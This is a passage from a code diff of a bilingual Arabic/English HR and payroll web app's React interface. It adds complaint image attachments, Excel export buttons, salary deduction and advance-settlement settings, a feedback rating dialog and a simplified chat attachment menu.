+            <Field label={language === "ar" ? "صور مرفقة" : "Attached images"} full>
+              <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
+                <input
+                  ref={complaintImageInputRef}
+                  type="file"
+                  accept="image/*"
+                  multiple
+                  onChange={handleComplaintImageSelection}
+                  style={{ display: "none" }}
+                />
+                <div style={{ display: "flex", alignItems: "center", gap: 10, flexWrap: "wrap" }}>
+                  <Button variant="outline" onClick={() => complaintImageInputRef.current?.click?.()}>
+                    <Image size={16} /> {language === "ar" ? "إضافة صور" : "Add images"}
+                  </Button>
+                  <span style={{ color: "var(--text-soft)", fontSize: 13 }}>
+                    {Array.isArray(complaintForm.images) && complaintForm.images.length
+                      ? `${complaintForm.images.length} ${language === "ar" ? "صورة مضافة" : "image(s) selected"}`
+                      : (language === "ar" ? "يمكنك إرفاق صور مع الشكوى أو الطلب" : "You can attach images to the complaint or request")}
+                  </span>
+                </div>
+
+                {Array.isArray(complaintForm.images) && complaintForm.images.length ? (
+                  <div style={{ display: "flex", gap: 10, flexWrap: "wrap" }}>
+                    {complaintForm.images.map((image) => (
+                      <div key={image.id} style={{ position: "relative", width: 88, height: 88, borderRadius: 16, overflow: "hidden", border: "1px solid var(--border)", background: "var(--surface-soft)" }}>
+                        <img src={image.url} alt={image.name || "complaint"} style={{ width: "100%", height: "100%", objectFit: "cover" }} />
+                        <button
+                          type="button"
+                          onClick={() => removeComplaintImage(image.id)}
+                          style={{ position: "absolute", top: 6, insetInlineEnd: 6, width: 24, height: 24, borderRadius: 999, border: "none", background: "rgba(15, 23, 42, 0.82)", color: "#fff", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}
+                        >
+                          <X size={14} />
+                        </button>
+                      </div>
+                    ))}
+                  </div>
+                ) : null}
+              </div>
+            </Field>
           </div>
 
           <div style={{ ...ui.modalActions, ...(isMobileView ? ui.modalActionsMobile : {}) }}>
@@ -3665,6 +5866,14 @@ useEffect(() => {
                   <MobileFieldRow label={language === "ar" ? "تذهب إلى" : "Target"} value={getComplaintTargetLabel(item.target, language)} />
                   <MobileFieldRow label={language === "ar" ? "العنوان" : "Subject"} value={item.subject || "-"} />
                   <MobileFieldRow label={language === "ar" ? "الرسالة" : "Message"} value={item.body || "-"} />
+                  <MobileFieldRow label={language === "ar" ? "الصور" : "Images"} value={Array.isArray(item.images) && item.images.length ? `${item.images.length} ${language === "ar" ? "مرفقة" : "attached"}` : "-"} />
+                  {Array.isArray(item.images) && item.images.length ? (
+                    <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
+                      {item.images.map((image) => (
+                        <img key={image.id || image.url} src={image.url} alt={image.name || "complaint"} style={{ width: 64, height: 64, objectFit: "cover", borderRadius: 12, border: "1px solid var(--border)" }} />
+                      ))}
+                    </div>
+                  ) : null}
                   <MobileFieldRow label={language === "ar" ? "التاريخ" : "Date"} value={item.createdAt || "-"} accent />
                 </MobileDataCard>
               )) : (
@@ -3681,6 +5890,7 @@ useEffect(() => {
                     <th style={ui.th}>{language === "ar" ? "تذهب إلى" : "Target"}</th>
                     <th style={ui.th}>{language === "ar" ? "العنوان" : "Subject"}</th>
                     <th style={ui.th}>{language === "ar" ? "الرسالة" : "Message"}</th>
+                    <th style={ui.th}>{language === "ar" ? "الصور" : "Images"}</th>
                     <th style={ui.th}>{language === "ar" ? "التاريخ" : "Date"}</th>
                   </tr>
                 </thead>
@@ -3692,10 +5902,19 @@ useEffect(() => {
                       <td style={ui.td}>{getComplaintTargetLabel(item.target, language)}</td>
                       <td style={ui.td}>{item.subject}</td>
                       <td style={ui.td}>{item.body}</td>
+                      <td style={ui.td}>
+                        {Array.isArray(item.images) && item.images.length ? (
+                          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
+                            {item.images.map((image) => (
+                              <img key={image.id || image.url} src={image.url} alt={image.name || "complaint"} style={{ width: 52, height: 52, objectFit: "cover", borderRadius: 10, border: "1px solid var(--border)" }} />
+                            ))}
+                          </div>
+                        ) : "-"}
+                      </td>
                       <td style={ui.td}>{item.createdAt}</td>
                     </tr>
                   )) : (
-                    <tr><td style={ui.emptyCell} colSpan={6}>{language === "ar" ? "لا توجد شكاوي أو طلبات حالياً." : "No complaints or requests yet."}</td></tr>
+                    <tr><td style={ui.emptyCell} colSpan={7}>{language === "ar" ? "لا توجد شكاوي أو طلبات حالياً." : "No complaints or requests yet."}</td></tr>
                   )}
                 </tbody>
               </table>
@@ -4040,7 +6259,7 @@ useEffect(() => {
                     </tr>
                   ))
                 ) : (
-                  <tr><td style={ui.emptyCell} colSpan={6}>{t.noPending}</td></tr>
+                  <tr><td style={ui.emptyCell} colSpan={7}>{t.noPending}</td></tr>
                 )}
               </tbody>
             </table>
@@ -4058,6 +6277,10 @@ useEffect(() => {
               description={requestHubHasApprovalActions ? (language === "ar" ? "طلبات الموظفين ومدير الإدارة ومدير الفرع التي تحتاج اعتمادًا." : "Pending leave and late requests that require approval.") : (language === "ar" ? "متابعة حالة طلبات الإجازة والتأخير الخاصة بك." : "Track the status of your leave and late requests.")}
             />
             <div style={ui.sectionActions}>
+              <Button variant="outline" onClick={() => exportLeaveApprovalsReport()}>
+                <Download size={16} />
+                <span>{language === "ar" ? "تصدير Excel" : "Export Excel"}</span>
+              </Button>
               <Button variant="outline" onClick={() => { setApprovalLogType("leave"); setApprovalLogOpen(true); }}>
                 {language === "ar" ? "سجل الاعتماد أو الرفض" : "Approval / Rejection Log"}
               </Button>
@@ -4113,6 +6336,10 @@ useEffect(() => {
               description={requestHubHasApprovalActions ? (language === "ar" ? "طلبات الموظفين ومدير الإدارة ومدير الفرع الخاصة بالسلف والمكافآت والخصومات." : "Pending financial requests that require approval.") : (language === "ar" ? "متابعة حالة طلبات السلف والمكافآت والخصومات الخاصة بك." : "Track the status of your advance, reward, and deduction requests.")}
             />
             <div style={ui.sectionActions}>
+              <Button variant="outline" onClick={() => exportFinancialApprovalsReport()}>
+                <Download size={16} />
+                <span>{language === "ar" ? "تصدير Excel" : "Export Excel"}</span>
+              </Button>
               <Button variant="outline" onClick={() => { setApprovalLogType("financial"); setApprovalLogOpen(true); }}>
                 {language === "ar" ? "سجل الاعتماد أو الرفض" : "Approval / Rejection Log"}
               </Button>
@@ -4131,7 +6358,7 @@ useEffect(() => {
                     ) : null}
                   >
                     <MobileFieldRow label={t.type} value={req.type} />
-                    <MobileFieldRow label={t.amount} value={currency(req.amount)} />
+                    <MobileFieldRow label={t.amount} value={currency(req.resolvedAmount || req.amount)} />
                     <MobileFieldRow label={t.reason} value={req.reason || "-"} />
                     <MobileFieldRow label={t.status} value={req.status} />
                     <MobileFieldRow label={t.approvedBy} value={req.decidedBy || "-"} accent />
@@ -4147,7 +6374,7 @@ useEffect(() => {
                       <tr key={req.id}>
                         <td style={ui.td}><strong>{req.employeeName}</strong></td>
                         <td style={ui.td}>{req.type}</td>
-                        <td style={ui.td}>{currency(req.amount)}</td>
+                        <td style={ui.td}>{currency(req.resolvedAmount || req.amount)}</td>
                         <td style={ui.td}>{req.reason}</td>
                         <td style={ui.td}>{req.status}</td>
                         <td style={ui.td}>{req.decidedBy || "-"}</td>
@@ -4435,6 +6662,12 @@ useEffect(() => {
               title={t.employeeData}
               description={language === "ar" ? "عرض الاسم، الفرع، رقم الهاتف، والإدارة فقط. اضغط على الصف لعرض نافذة التفاصيل." : "Show only name, branch, phone, and department. Click the row to open a details modal."}
             />
+            <div style={ui.sectionActions}>
+              <Button variant="outline" onClick={() => exportEmployeeDataReport()}>
+                <Download size={16} />
+                <span>{language === "ar" ? "تصدير Excel" : "Export Excel"}</span>
+              </Button>
+            </div>
 
             {canManageAll && (
               <div style={ui.branchFilterBar}>
@@ -4506,6 +6739,12 @@ useEffect(() => {
         <>
           <Card>
             <SectionHeader icon={Briefcase} title={t.salaryData} description={t.salaryDataDesc} isMobile={isMobileView} />
+            <div style={ui.sectionActions}>
+              <Button variant="outline" onClick={() => exportSalaryDataReport()}>
+                <Download size={16} />
+                <span>{language === "ar" ? "تصدير Excel" : "Export Excel"}</span>
+              </Button>
+            </div>
             {isMobileView ? (
               <div style={ui.mobileCardsStack}>
                 {filteredEmployees.map((emp) => {
@@ -4568,6 +6807,12 @@ useEffect(() => {
         <>
           <Card>
             <SectionHeader icon={Clock3} title={t.leaveData} description={t.leaveDataDesc} isMobile={isMobileView} />
+            <div style={ui.sectionActions}>
+              <Button variant="outline" onClick={() => exportLeaveManagementReport()}>
+                <Download size={16} />
+                <span>{language === "ar" ? "تصدير Excel" : "Export Excel"}</span>
+              </Button>
+            </div>
             {isMobileView ? (
               <div style={ui.mobileCardsStack}>
                 {filteredEmployees.map((emp) => (
@@ -4658,6 +6903,36 @@ useEffect(() => {
           </Field>
           <Field label={t.fromHour}><Input type="time" value={form.fromHour} onChange={(e) => setForm((p) => ({ ...p, fromHour: e.target.value }))} /></Field>
           <Field label={t.toHour}><Input type="time" value={form.toHour} onChange={(e) => setForm((p) => ({ ...p, toHour: e.target.value }))} /></Field>
+          <Field label="وضع خصم التأخير">
+            <Select value={form.attendanceLateDeductionMode} onChange={(e) => setForm((p) => ({ ...p, attendanceLateDeductionMode: e.target.value }))}>
+              <option value="automatic">تلقائي</option>
+              <option value="manual">يدوي</option>
+            </Select>
+          </Field>
+          <Field label="نوع خصم التأخير">
+            <Select value={form.attendanceLateValueType} onChange={(e) => setForm((p) => ({ ...p, attendanceLateValueType: e.target.value }))}>
+              <option value="amount">مبلغ ثابت</option>
+              <option value="percentage">نسبة مئوية</option>
+            </Select>
+          </Field>
+          <Field label="قيمة خصم التأخير">
+            <Input type="number" value={form.attendanceLateValue} onChange={(e) => setForm((p) => ({ ...p, attendanceLateValue: e.target.value }))} />
+          </Field>
+          <Field label="وضع خصم الغياب">
+            <Select value={form.attendanceAbsenceDeductionMode} onChange={(e) => setForm((p) => ({ ...p, attendanceAbsenceDeductionMode: e.target.value }))}>
+              <option value="automatic">تلقائي</option>
+              <option value="manual">يدوي</option>
+            </Select>
+          </Field>
+          <Field label="نوع خصم الغياب">
+            <Select value={form.attendanceAbsenceValueType} onChange={(e) => setForm((p) => ({ ...p, attendanceAbsenceValueType: e.target.value }))}>
+              <option value="amount">مبلغ ثابت</option>
+              <option value="percentage">نسبة مئوية</option>
+            </Select>
+          </Field>
+          <Field label="قيمة خصم الغياب">
+            <Input type="number" value={form.attendanceAbsenceValue} onChange={(e) => setForm((p) => ({ ...p, attendanceAbsenceValue: e.target.value }))} />
+          </Field>
           <Field label={t.employeeDescription} full><Textarea value={form.description} onChange={(e) => setForm((p) => ({ ...p, description: e.target.value }))} /></Field>
         </div>
         <div style={{ ...ui.modalActions, ...(isMobileView ? ui.modalActionsMobile : {}) }}><Button onClick={addEmployee}>{t.saveEmployee}</Button></div>
@@ -4690,6 +6965,36 @@ useEffect(() => {
           </Field>
           <Field label={t.fromHour}><Input type="time" value={editForm.fromHour} onChange={(e) => setEditForm((p) => ({ ...p, fromHour: e.target.value }))} /></Field>
           <Field label={t.toHour}><Input type="time" value={editForm.toHour} onChange={(e) => setEditForm((p) => ({ ...p, toHour: e.target.value }))} /></Field>
+          <Field label="وضع خصم التأخير">
+            <Select value={editForm.attendanceLateDeductionMode} onChange={(e) => setEditForm((p) => ({ ...p, attendanceLateDeductionMode: e.target.value }))}>
+              <option value="automatic">تلقائي</option>
+              <option value="manual">يدوي</option>
+            </Select>
+          </Field>
+          <Field label="نوع خصم التأخير">
+            <Select value={editForm.attendanceLateValueType} onChange={(e) => setEditForm((p) => ({ ...p, attendanceLateValueType: e.target.value }))}>
+              <option value="amount">مبلغ ثابت</option>
+              <option value="percentage">نسبة مئوية</option>
+            </Select>
+          </Field>
+          <Field label="قيمة خصم التأخير">
+            <Input type="number" value={editForm.attendanceLateValue} onChange={(e) => setEditForm((p) => ({ ...p, attendanceLateValue: e.target.value }))} />
+          </Field>
+          <Field label="وضع خصم الغياب">
+            <Select value={editForm.attendanceAbsenceDeductionMode} onChange={(e) => setEditForm((p) => ({ ...p, attendanceAbsenceDeductionMode: e.target.value }))}>
+              <option value="automatic">تلقائي</option>
+              <option value="manual">يدوي</option>
+            </Select>
+          </Field>
+          <Field label="نوع خصم الغياب">
+            <Select value={editForm.attendanceAbsenceValueType} onChange={(e) => setEditForm((p) => ({ ...p, attendanceAbsenceValueType: e.target.value }))}>
+              <option value="amount">مبلغ ثابت</option>
+              <option value="percentage">نسبة مئوية</option>
+            </Select>
+          </Field>
+          <Field label="قيمة خصم الغياب">
+            <Input type="number" value={editForm.attendanceAbsenceValue} onChange={(e) => setEditForm((p) => ({ ...p, attendanceAbsenceValue: e.target.value }))} />
+          </Field>
           <Field label={t.employeeDescription} full><Textarea value={editForm.description} onChange={(e) => setEditForm((p) => ({ ...p, description: e.target.value }))} /></Field>
         </div>
         <div style={{ ...ui.modalActions, ...(isMobileView ? ui.modalActionsMobile : {}) }}><Button onClick={saveEmployeeEdit}>{t.saveEdit}</Button></div>
@@ -4722,6 +7027,36 @@ useEffect(() => {
           </Field>
           <Field label={t.fromHour}><Input type="time" value={completeForm.fromHour} onChange={(e) => setCompleteForm((p) => ({ ...p, fromHour: e.target.value }))} /></Field>
           <Field label={t.toHour}><Input type="time" value={completeForm.toHour} onChange={(e) => setCompleteForm((p) => ({ ...p, toHour: e.target.value }))} /></Field>
+          <Field label="وضع خصم التأخير">
+            <Select value={completeForm.attendanceLateDeductionMode} onChange={(e) => setCompleteForm((p) => ({ ...p, attendanceLateDeductionMode: e.target.value }))}>
+              <option value="automatic">تلقائي</option>
+              <option value="manual">يدوي</option>
+            </Select>
+          </Field>
+          <Field label="نوع خصم التأخير">
+            <Select value={completeForm.attendanceLateValueType} onChange={(e) => setCompleteForm((p) => ({ ...p, attendanceLateValueType: e.target.value }))}>
+              <option value="amount">مبلغ ثابت</option>
+              <option value="percentage">نسبة مئوية</option>
+            </Select>
+          </Field>
+          <Field label="قيمة خصم التأخير">
+            <Input type="number" value={completeForm.attendanceLateValue} onChange={(e) => setCompleteForm((p) => ({ ...p, attendanceLateValue: e.target.value }))} />
+          </Field>
+          <Field label="وضع خصم الغياب">
+            <Select value={completeForm.attendanceAbsenceDeductionMode} onChange={(e) => setCompleteForm((p) => ({ ...p, attendanceAbsenceDeductionMode: e.target.value }))}>
+              <option value="automatic">تلقائي</option>
+              <option value="manual">يدوي</option>
+            </Select>
+          </Field>
+          <Field label="نوع خصم الغياب">
+            <Select value={completeForm.attendanceAbsenceValueType} onChange={(e) => setCompleteForm((p) => ({ ...p, attendanceAbsenceValueType: e.target.value }))}>
+              <option value="amount">مبلغ ثابت</option>
+              <option value="percentage">نسبة مئوية</option>
+            </Select>
+          </Field>
+          <Field label="قيمة خصم الغياب">
+            <Input type="number" value={completeForm.attendanceAbsenceValue} onChange={(e) => setCompleteForm((p) => ({ ...p, attendanceAbsenceValue: e.target.value }))} />
+          </Field>
           <Field label={t.employeeDescription} full><Textarea value={completeForm.description} onChange={(e) => setCompleteForm((p) => ({ ...p, description: e.target.value }))} /></Field>
         </div>
         <div style={{ ...ui.modalActions, ...(isMobileView ? ui.modalActionsMobile : {}) }}><Button onClick={completeEmployeeData}>{t.completeSave}</Button></div>
@@ -4737,7 +7072,10 @@ useEffect(() => {
                   {statementEmployee.department} — {statementEmployee.phone}
                 </p>
               </div>
-              <div style={{ width: isMobileView ? "100%" : "auto", display: "flex", justifyContent: isMobileView ? "flex-start" : "flex-end" }}>
+              <div style={{ width: isMobileView ? "100%" : "auto", display: "flex", justifyContent: isMobileView ? "flex-start" : "flex-end", gap: 10, flexWrap: "wrap", alignItems: "center" }}>
+                <Button variant="outline" onClick={exportAccountStatementReport}>
+                  {language === "ar" ? "تصدير Excel" : "Export Excel"}
+                </Button>
                 <Badge>{t.accountStatement}</Badge>
               </div>
             </div>
@@ -4764,8 +7102,21 @@ useEffect(() => {
                 <div style={ui.statementValue}>{currency(statementData.grossSalary)}</div>
               </Card>
               <Card style={ui.statementCard}>
-                <div style={ui.summaryTitle}>{t.currentAdvanceBalance}</div>
+                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8 }}>
+                  <div style={ui.summaryTitle}>{t.currentAdvanceBalance}</div>
+                  {canManageAll && (
+                    <button
+                      type="button"
+                      onClick={() => openAdvanceSettlementDialog(statementEmployee)}
+                      style={ui.advanceMiniButton}
+                      title={language === "ar" ? "إعداد خصم السلفة" : "Advance deduction settings"}
+                    >
+                      <Plus size={14} />
+                    </button>
+                  )}
+                </div>
                 <div style={ui.statementValue}>{currency(statementData.currentAdvanceBalance)}</div>
+                <div style={ui.summarySubtitle}>{getAdvanceDeductionLabel(statementEmployee, statementData.grossSalary)}</div>
               </Card>
               <Card style={ui.statementCard}>
                 <div style={ui.summaryTitle}>{t.approvedRewards}</div>
@@ -4792,8 +7143,8 @@ useEffect(() => {
                         title={req.type}
                         action={<Button variant="outline" style={ui.smallBtn} onClick={() => openNotificationDialog(req)}>{t.notification}</Button>}
                       >
-                        <MobileFieldRow label={t.amount} value={currency(req.amount)} />
-                        <MobileFieldRow label={t.status} value={req.status || "-"} />
+                        <MobileFieldRow label={t.amount} value={currency(req.resolvedAmount || req.amount)} />
+                        <MobileFieldRow label={t.status} value={getFinancialSettlementStatusLabel(req)} />
                         <MobileFieldRow label={t.approvedBy} value={req.decidedBy || "-"} />
                         <MobileFieldRow label={t.submittedAt} value={req.createdAt ? new Date(req.createdAt).toLocaleDateString(language === "ar" ? "ar-EG" : "en-US") : (language === "ar" ? "سجل سابق" : "Previous record")} />
                         <MobileFieldRow label={t.notification} value={getNotificationContent(req)} accent />
@@ -4821,7 +7172,7 @@ useEffect(() => {
                         statementData.transactions.map((req) => (
                           <tr key={req.id}>
                             <td style={ui.td}>{req.type}</td>
-                            <td style={ui.td}>{currency(req.amount)}</td>
+                            <td style={ui.td}>{currency(req.resolvedAmount || req.amount)}</td>
                             <td style={ui.td}>{req.status}</td>
                             <td style={ui.td}>{req.decidedBy || "-"}</td>
                             <td style={ui.td}>{req.createdAt ? new Date(req.createdAt).toLocaleDateString(language === "ar" ? "ar-EG" : "en-US") : "سجل سابق"}</td>
@@ -4833,7 +7184,7 @@ useEffect(() => {
                           </tr>
                         ))
                       ) : (
-                        <tr><td style={ui.emptyCell} colSpan={6}>{t.noTransactions}</td></tr>
+                        <tr><td style={ui.emptyCell} colSpan={7}>{t.noTransactions}</td></tr>
                       )}
                     </tbody>
                   </table>
@@ -4844,7 +7195,7 @@ useEffect(() => {
         ) : null}
       </Modal>
 
-      <Modal open={notificationDialogOpen} title={t.notificationDetails} onClose={() => { setNotificationDialogOpen(false); setSelectedNotification(null); }} maxWidth={520}>
+      <Modal open={notificationDialogOpen} title={t.notificationDetails} onClose={() => { setNotificationDialogOpen(false); setSelectedNotification(null); }} maxWidth={620}>
         {selectedNotification ? (
           <div style={{ display: "grid", gap: 14 }}>
             <div>
@@ -4852,9 +7203,24 @@ useEffect(() => {
               <div style={ui.noticeText}>{selectedNotification.type}</div>
             </div>
             <div>
+              <div style={ui.label}>{t.status}</div>
+              <div style={ui.noticeText}>{getFinancialSettlementStatusLabel(selectedNotification)}</div>
+            </div>
+            <div>
               <div style={ui.label}>{t.notification}</div>
               <div style={ui.noticeText}>{getNotificationContent(selectedNotification)}</div>
             </div>
+            {getLinkedSalaryDeposit(selectedNotification) ? (
+              <div>
+                <div style={ui.label}>{language === "ar" ? "المرتب المرتبط" : "Linked salary deposit"}</div>
+                <div style={ui.noticeText}>
+                  {getLinkedSalaryDeposit(selectedNotification)?.month
+                    ? `${language === "ar" ? "تمت التسوية مع مرتب شهر" : "Settled with salary for"} ${getLinkedSalaryDeposit(selectedNotification)?.month}`
+                    : (language === "ar" ? "تمت التسوية مع إنزال مرتب" : "Settled with salary deposit")}
+                  {` | ${language === "ar" ? "الصافي" : "Net"}: ${currency(getLinkedSalaryDeposit(selectedNotification)?.amount || 0)}`}
+                </div>
+              </div>
+            ) : null}
           </div>
         ) : null}
         <div style={{ ...ui.modalActions, ...(isMobileView ? ui.modalActionsMobile : {}) }}>
@@ -4872,6 +7238,12 @@ useEffect(() => {
         onClose={() => setApprovalLogOpen(false)}
         maxWidth={1100}
       >
+        <div style={{ ...ui.sectionActions, marginBottom: 12 }}>
+          <Button variant="outline" onClick={() => exportApprovalLogReport(approvalLogType)}>
+            <Download size={16} />
+            <span>{language === "ar" ? "تصدير Excel" : "Export Excel"}</span>
+          </Button>
+        </div>
         {isMobileView ? (
           <div style={ui.mobileCardsStack}>
             {(approvalLogType === "leave" ? approvalLogLeaveRequests : approvalLogFinancialRequests).length ? (
@@ -4915,7 +7287,7 @@ useEffect(() => {
                   ))
                 ) : (
                   <tr>
-                    <td style={ui.emptyCell} colSpan={6}>
+                    <td style={ui.emptyCell} colSpan={7}>
                       {language === "ar" ? "لا توجد سجلات اعتماد أو رفض حالياً." : "No approval or rejection history yet."}
                     </td>
                   </tr>
@@ -5211,17 +7583,13 @@ useEffect(() => {
         )}
       </Modal>
 
-      <Modal open={attachSheetOpen} title={t.chatAttach} onClose={() => setAttachSheetOpen(false)} maxWidth={760}>
+      <Modal open={attachSheetOpen} title={t.chatAttach} onClose={() => setAttachSheetOpen(false)} maxWidth={620}>
         <div style={ui.attachGrid}>
           {[
-            { icon: <UserPlus size={28} />, label: chatLabels.contact, onClick: () => setAttachSheetOpen(false) },
-            { icon: <MapPin size={28} />, label: chatLabels.location, onClick: () => setAttachSheetOpen(false) },
-            { icon: <Camera size={28} />, label: chatLabels.camera, onClick: () => { openChatCamera(); } },
-            { icon: <Image size={28} />, label: chatLabels.photos, onClick: () => { sendQuickAttachment("image"); setAttachSheetOpen(false); } },
-            { icon: <Sparkles size={28} />, label: chatLabels.aiImages, onClick: () => setAttachSheetOpen(false) },
-            { icon: <CalendarDays size={28} />, label: chatLabels.event, onClick: () => setAttachSheetOpen(false) },
-            { icon: <BadgeInfo size={28} />, label: chatLabels.poll, onClick: () => setAttachSheetOpen(false) },
-            { icon: <FileText size={28} />, label: chatLabels.document, onClick: () => { sendQuickAttachment("file"); setAttachSheetOpen(false); } },
+            { icon: <Image size={22} />, label: chatLabels.photos, onClick: () => { sendQuickAttachment("image"); setAttachSheetOpen(false); } },
+            { icon: <Camera size={22} />, label: chatLabels.camera, onClick: () => { openChatCamera(); } },
+            { icon: <FileText size={22} />, label: chatLabels.document, onClick: () => { sendQuickAttachment("file"); setAttachSheetOpen(false); } },
+            { icon: <BadgeInfo size={22} />, label: chatLabels.poll, onClick: () => { sendQuickAttachment("poll"); setAttachSheetOpen(false); } },
           ].map((item) => (
             <button key={item.label} type="button" onClick={item.onClick} style={ui.attachOption}>
               <span style={ui.attachOptionIcon}>{item.icon}</span>
@@ -5243,6 +7611,39 @@ useEffect(() => {
           <button type="button" style={{ ...ui.actionMenuItem, ...ui.actionMenuDanger }} onClick={() => { deleteChatById(activeConversation?.id); setChatMoreOpen(false); }}><Trash2 size={18} /> <span>{chatLabels.deleteChat}</span></button>
           <button type="button" style={ui.actionMenuItem} onClick={clearActiveChatMessages}><Trash2 size={18} /> <span>{chatLabels.clearChat}</span></button>
           {activeConversation?.type === "group" && <button type="button" style={{ ...ui.actionMenuItem, ...ui.actionMenuDanger }} onClick={leaveCurrentGroup}><LogOut size={18} /> <span>{chatLabels.leaveGroup}</span></button>}
+        </div>
+      </Modal>
+
+      <Modal open={feedbackWidgetOpen} title={language === "ar" ? "تقييم التطبيق وإرسال رأيك" : "Rate the app and send feedback"} onClose={() => setFeedbackWidgetOpen(false)} maxWidth={520}>
+        <div style={{ display: "grid", gap: 16 }}>
+          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, flexWrap: "wrap" }}>
+            {[1, 2, 3, 4, 5].map((value) => (
+              <button
+                key={value}
+                type="button"
+                onClick={() => setFeedbackForm((prev) => ({ ...prev, rating: value }))}
+                style={{
+                  ...ui.feedbackStarButton,
+                  ...(value <= Number(feedbackForm.rating || 0) ? ui.feedbackStarButtonActive : {}),
+                }}
+              >
+                <Star size={22} fill={value <= Number(feedbackForm.rating || 0) ? "currentColor" : "none"} />
+              </button>
+            ))}
+          </div>
+          <Field label={language === "ar" ? "اكتب رأيك" : "Write your feedback"} full>
+            <Textarea
+              rows={5}
+              value={feedbackForm.message}
+              onChange={(e) => setFeedbackForm((prev) => ({ ...prev, message: e.target.value }))}
+              placeholder={language === "ar" ? "اكتب ملاحظتك أو اقتراحك هنا..." : "Write your comment or suggestion here..."}
+            />
+          </Field>
+          {feedbackMessage ? <div style={ui.infoBox}>{feedbackMessage}</div> : null}
+          <div style={{ display: "flex", gap: 10, justifyContent: language === "ar" ? "flex-start" : "flex-end", flexWrap: "wrap" }}>
+            <Button onClick={submitFeedback}><Send size={16} /> {language === "ar" ? "إرسال" : "Send"}</Button>
+            <Button variant="outline" onClick={() => setFeedbackWidgetOpen(false)}>{language === "ar" ? "إغلاق" : "Close"}</Button>
+          </div>
         </div>
       </Modal>
 
@@ -5332,6 +7733,52 @@ useEffect(() => {
         <div style={{ ...ui.modalActions, ...(isMobileView ? ui.modalActionsMobile : {}) }}><Button onClick={submitAdvanceRequest}>{canManageAll ? t.advance : t.requestAdvance}</Button></div>
       </Modal>
 
+      <Modal open={advanceSettlementDialogOpen} title={language === "ar" ? "إعداد خصم السلفة" : "Advance deduction settings"} onClose={() => setAdvanceSettlementDialogOpen(false)} maxWidth={520}>
+        <Field label={language === "ar" ? "طريقة خصم السلفة" : "Advance deduction mode"}>
+          <Select value={advanceSettlementForm.deductionMode} onChange={(e) => setAdvanceSettlementForm((p) => ({ ...p, deductionMode: e.target.value }))}>
+            <option value="automatic">{language === "ar" ? "تلقائي من المرتب" : "Automatic from salary"}</option>
+            <option value="manual">{language === "ar" ? "يدوي" : "Manual"}</option>
+          </Select>
+        </Field>
+        <Field label={language === "ar" ? "نوع التنقيص" : "Reduction type"}>
+          <Select value={advanceSettlementForm.valueType} onChange={(e) => setAdvanceSettlementForm((p) => ({ ...p, valueType: e.target.value }))}>
+            <option value="amount">{language === "ar" ? "قيمة ثابتة" : "Fixed amount"}</option>
+            <option value="percentage">{language === "ar" ? "نسبة من المرتب" : "Salary percentage"}</option>
+          </Select>
+        </Field>
+        <Field label={advanceSettlementForm.valueType === "percentage" ? (language === "ar" ? "النسبة %" : "Percentage %") : t.amount}>
+          <Input
+            type="number"
+            min="0"
+            max={statementEmployee ? getAdvanceDeductionDetails({ ...statementEmployee, advanceDeductionMode: advanceSettlementForm.deductionMode, advanceDeductionValueType: advanceSettlementForm.valueType, advanceDeductionValue: advanceSettlementForm.value }, statementData?.grossSalary || statementEmployee.salary || statementEmployee.basicSalary).maxAllowedValue : undefined}
+            value={advanceSettlementForm.value}
+            onChange={(e) => setAdvanceSettlementForm((p) => ({ ...p, value: e.target.value }))}
+          />
+        </Field>
+        {statementEmployee && (() => {
+          const previewDetails = getAdvanceDeductionDetails({
+            ...statementEmployee,
+            advanceDeductionMode: advanceSettlementForm.deductionMode,
+            advanceDeductionValueType: advanceSettlementForm.valueType,
+            advanceDeductionValue: advanceSettlementForm.value,
+          }, statementData?.grossSalary || statementEmployee.salary || statementEmployee.basicSalary);
+          return (
+          <Card style={{ ...ui.statementCard, padding: 14 }}>
+            <div style={ui.summaryTitle}>{language === "ar" ? "المبلغ المتوقع خصمه من السلفة" : "Expected advance deduction"}</div>
+            <div style={ui.statementValue}>
+              {currency(previewDetails.amount)}
+            </div>
+            <div style={{ ...ui.summarySubtitle, marginTop: 8 }}>
+              {advanceSettlementForm.valueType === "percentage"
+                ? `${language === "ar" ? "الحد الأقصى المسموح" : "Maximum allowed"}: ${Number(previewDetails.maxAllowedValue).toFixed(2).replace(/\.00$/, "")} %`
+                : `${language === "ar" ? "الحد الأقصى المسموح" : "Maximum allowed"}: ${currency(previewDetails.maxAllowedValue)}`}
+            </div>
+          </Card>
+          );
+        })()}
+        <div style={{ ...ui.modalActions, ...(isMobileView ? ui.modalActionsMobile : {}) }}><Button onClick={saveAdvanceSettlementSettings}>{language === "ar" ? "حفظ" : "Save"}</Button></div>
+      </Modal>
+
       <Modal open={salaryDepositDialogOpen} title={t.salaryDeposit} onClose={() => setSalaryDepositDialogOpen(false)} maxWidth={560}>
         <Field label={t.month}>
           <Select value={salaryDepositForm.month} onChange={(e) => setSalaryDepositForm((p) => ({ ...p, month: e.target.value }))}>
@@ -5365,7 +7812,23 @@ useEffect(() => {
             </Select>
           </Field>
         )}
-        <Field label={t.amount}><Input type="number" value={rewardRequestForm.amount} onChange={(e) => setRewardRequestForm((p) => ({ ...p, amount: e.target.value }))} /></Field>
+        {canManageAll && rewardRequestForm.actionType === "خصم" && (
+          <>
+            <Field label={language === "ar" ? "طريقة الخصم" : "Deduction mode"}>
+              <Select value={rewardRequestForm.deductionMode} onChange={(e) => setRewardRequestForm((p) => ({ ...p, deductionMode: e.target.value }))}>
+                <option value="manual">{language === "ar" ? "يدوي" : "Manual"}</option>
+                <option value="automatic">{language === "ar" ? "تلقائي" : "Automatic"}</option>
+              </Select>
+            </Field>
+            <Field label={language === "ar" ? "نوع القيمة" : "Value type"}>
+              <Select value={rewardRequestForm.valueType} onChange={(e) => setRewardRequestForm((p) => ({ ...p, valueType: e.target.value }))}>
+                <option value="amount">{language === "ar" ? "قيمة ثابتة" : "Fixed amount"}</option>
+                <option value="percentage">{language === "ar" ? "نسبة من الراتب" : "Salary percentage"}</option>
+              </Select>
+            </Field>
+          </>
+        )}
